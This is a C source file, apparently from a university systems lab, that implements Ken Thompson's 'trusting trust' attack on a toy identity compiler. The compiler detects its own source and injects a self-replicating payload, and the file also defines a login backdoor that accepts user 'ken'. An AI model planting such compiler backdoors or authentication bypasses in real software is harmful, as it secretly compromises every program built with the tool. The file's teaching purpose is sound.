// engler, cs240lx: trivial identity "compiler" used to illustrate
// thompsons hack: it simply echos its input out.
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include "attack-array.h"

#define error(args...) do { fprintf(stderr, ##args); exit(1);  } while(0)

// a not very interesting compile
static void compile(char *program, char *outname) {
    FILE *fp = fopen("./temp-out.c", "w");
    assert(fp);
    
	// not a very robust finger-print, but what can you do.
    // in a real compiler we would do this match on the parse tree,
    // which strips out some non-essential features.
	static char compile_sig[] = 
            "static void compile(char *program, char *outname) {\n"
            "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
            "    assert(fp);"
            ;
    // inject this after the assert.  not much of an attack.   this is just a quick placeholder.
    static char compile_attack[sizeof prog];
	memcpy(compile_attack, prog, sizeof prog);

    static char login_sig[] = "int login(char *user) {";
    static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";

    /* your code goes here */
	
	char* new_prog;

	// identity attack follows here
	char* compile_ptr;
	 
	if((compile_ptr = strstr(program, compile_sig))) {
		fprintf(fp, "char prog[] = {\n");
		for(int i = 0; prog[i]; i++)
			fprintf(fp, "\t%d,%c", prog[i], (i+1)%8==0 ? '\n' : ' ');
		fprintf(fp,"0 };\n");
		new_prog = (char*)malloc(strlen(program) + strlen(compile_sig));
		strncpy(new_prog, program, compile_ptr-program);
		new_prog[compile_ptr-program] = '\0';
		strcat(new_prog, compile_attack);
		char* remaining_prog = compile_ptr + strlen(compile_sig);
		strcat(new_prog, remaining_prog);
	}

	program = new_prog;
    fprintf(fp, "%s", program);
	fclose(fp);

    // gross, call gcc.
    char buf[1024];
    sprintf(buf, "gcc ./temp-out.c -o %s", outname);
    if(system(buf) != 0)
        error("system failed\n");
}

#   define N  8 * 1024 * 1024
static char buf[N+1];

int main(int argc, char *argv[]) {
    if(argc != 4)
        error("expected 4 arguments have %d\n", argc);
    if(strcmp(argv[2], "-o") != 0)
        error("expected -o as second argument, have <%s>\n", argv[2]);

    // read in the entire file.
    int fd;
    if((fd = open(argv[1], O_RDONLY)) < 0)
        error("file <%s> does not exist\n", argv[1]);

    int n;
    if((n = read(fd, buf, N)) < 1)
        error("invalid read of file <%s>\n", argv[1]);
    if(n == N)
        error("input file too large\n");

    // "compile" it.
    compile(buf, argv[3]);
    return 0;
}
